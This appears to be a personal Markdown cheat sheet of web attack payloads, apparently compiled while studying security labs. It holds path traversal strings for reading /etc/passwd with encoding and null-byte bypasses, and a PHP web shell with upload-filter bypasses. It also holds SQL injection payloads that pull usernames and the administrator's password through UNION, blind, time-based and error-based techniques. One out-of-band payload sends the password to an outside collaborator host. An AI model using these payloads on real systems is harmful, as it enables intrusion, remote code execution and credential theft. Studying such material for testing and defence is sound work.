# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd

When server URL-decode of the input before using it.
>..%252f..%252f..%252fetc/passwd

When server require ending, like `png` , use null bytes, for example
>../../../etc/passwd%00.png





## **FILE UPLOAD**
Default way:
><?php echo system($_GET['command']); ?>

Flawed file type validation:
Change content type to image/jpeg

Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
Instead of 
`Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
  We can use
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  Or obfuscated versions


### **SQL INJECTION**

Login Bypass:

`administrator'--`

#Substring:

`SUBSTRING('foobar', 4, 2)`
Oracle `SUBSTR('foobar', 4, 2)`

#Simle WAF Bypass by encoding:

`<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>`

`<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`


### **UNION SQL INJECTION**

Simple Data Retrieve (request `SELECT name, description FROM products WHERE category = 'Gifts'`):

`' UNION SELECT username, password FROM users--`

**Oracle add `from dual`**

### Determine number of columns:

`' ORDER BY 3--`
Second method, allow to determine type of data in column:

`' UNION SELECT NULL,NULL,NULL--`/`' UNION SELECT 'a',NULL,NULL,NULL--`

### Concatenation of strings:

`' UNION SELECT username || '~' || password FROM users--`
Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.

## **BLIND SQL INJECTION**

### conditional based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

### error based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

`'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

### visible errors based

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### time based

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

### out of band interaction

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
